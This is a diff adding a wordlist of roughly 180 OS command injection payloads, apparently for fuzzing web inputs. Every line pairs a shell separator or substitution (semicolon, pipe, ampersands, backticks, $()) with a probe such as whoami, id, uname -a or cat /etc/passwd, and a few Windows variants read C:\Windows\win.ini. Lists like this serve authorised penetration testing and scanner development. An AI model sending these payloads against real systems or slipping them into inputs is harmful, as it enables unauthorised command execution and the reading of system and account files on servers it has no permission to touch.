@@ -1,0 +1,180 @@
+ | uname -a
+$() cat /etc/passwd
+ && ls
+|pwd
+ || whoami
+; whoami
+ && id
+& whoami
+&& cat /etc/passwd
+ 
+ whoami
+&cat /etc/passwd
+|| whoami
+&& uname -a
+ || pwd
+$() whoami
+&pwd
+||whoami
+ & pwd
+||uname -a
+ $() ls
+$() ls
+$(ls)
+|| uname -a
+ $() pwd
+; id
+ ` uname -a
+
+uname -a
+; ls
+ || cat /etc/passwd
+ && whoami
+$()cat /etc/passwd
+& pwd
+
+whoami
+
+ cat /etc/passwd
+ 
+ ls
+ & id
+| cat /etc/passwd
+ $() uname -a
+ ` whoami
+$(pwd)
+||ls
+` cat /etc/passwd
+
+cat /etc/passwd
+|| id
+|| ls
+`cat /etc/passwd`
+$() pwd
+ || ls
+ | whoami
+ & ls
+ 
+ pwd
+ && cat /etc/passwd
+ ; cat /etc/passwd
+`id
+ ` id
+ ; pwd
+; uname -a
+$() uname -a
+
+ uname -a
+`cat /etc/passwd
+;ls
+| pwd
+| id
+& cat /etc/passwd
+$(id)
+`whoami`
+$()uname -a
+||pwd
+&&whoami
+$()whoami
+ ; whoami
+ 
+ id
+;whoami
+`whoami
+&& id
+&ls
+ ; ls
+ && pwd
+&&ls
+&& type C:\Windows\win.ini
+|uname -a
+`ls
+$() id
+` pwd
+
+pwd
+;id
+` id
+& type C:\Windows\win.ini
+
+ id
+ & whoami
+$()ls
+&uname -a
+ || uname -a
+
+id
+ 
+ cat /etc/passwd
+| type C:\Windows\win.ini
+ & uname -a
+; cat /etc/passwd
+& ls
+&& dir
+&&id
+& id
+&& ls
+
+ pwd
+ ; id
+$(whoami)
+
+ whoami
+&& pwd
+| dir
+ ` pwd
+| whoami
+& uname -a
+&whoami
+| ls
+ | pwd
+&&cat /etc/passwd
+ ` ls
+ ` cat /etc/passwd
+; pwd
+ | id
+&&uname -a
+|| pwd
+ || id
+$()id
+`pwd
+
+ls
+`uname -a
+ ; uname -a
+;uname -a
+ $() cat /etc/passwd
+ & cat /etc/passwd
+||cat /etc/passwd
+ | cat /etc/passwd
+|| cat /etc/passwd
+`uname -a`
+|cat /etc/passwd
+ $() whoami
+|whoami
+` uname -a
+&&pwd
+$()pwd
+;pwd
+` ls
+ && uname -a
+|ls
+$(uname -a)
+&id
+`id`
+| uname -a
+
+ ls
+& dir
+` whoami
+$(cat /etc/passwd)
+ | ls
+`pwd`
+&& whoami
+ 
+ uname -a
+||id
+;cat /etc/passwd
+ $() id
+`ls`
+|id
